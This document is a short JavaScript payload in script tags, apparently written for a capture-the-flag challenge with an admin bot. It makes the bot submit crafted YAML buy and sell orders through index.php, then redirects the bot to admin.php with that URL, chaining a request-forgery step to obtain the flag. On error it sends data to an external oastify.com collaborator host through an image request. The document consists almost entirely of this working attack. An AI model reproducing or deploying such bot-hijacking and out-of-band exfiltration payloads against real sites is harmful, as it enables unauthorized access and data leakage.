<script>
(async () => {
    try {
      const yaml =
        "- {amount: 1000001, currency: ZZ, op: BUY}\n" +
        "- {amount: 1000001, currency: ZZ, op: SELL}\n" +
        "- {amount: 1, currency: FL, op: BUY}\n";

      // YAMLを返すindex.phpのURL（bot内でアクセス）
      const yamlUrl = "http://localhost:5000/index.php?html=" + encodeURIComponent(yaml);

      // admin.phpにリダイレクト（bot内で処理）
      window.location.href = "http://localhost:5000/admin.php?url=" + encodeURIComponent(yamlUrl);

    } catch (e) {
      new Image().src = "https://zgjhdwjylliddautpr6a8kr9w02rqie7.oastify.com/?error=" + encodeURIComponent(String(e));
    }
})();
</script>
